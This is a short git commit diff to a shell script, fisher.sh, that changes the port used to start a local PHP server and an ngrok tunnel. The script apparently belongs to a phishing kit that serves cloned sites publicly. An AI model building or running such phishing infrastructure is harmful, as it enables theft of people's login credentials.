a51c11a8a960d1492383a6efa61966c78199dade
Jatin Kalwar <77274095+jatinkalwar@users.noreply.github.com>
2021-10-18 22:20:27 +0530

    Update fisher.sh

--- fisher.sh
+++ fisher.sh
@@ -766,10 +766,10 @@ fi
 
 
 echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Host Server..."
-cd $HOME/fisher/webs/$site && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+cd $HOME/fisher/webs/$site && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 8
 echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Ngrok Server..."
-./ngrok http 3333 > /dev/null 2>&1 &
+./ngrok http 5555 > /dev/null 2>&1 &
 sleep 10
 link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
 status=$(curl -s -o /dev/null -I -w "%{http_code}" $link)
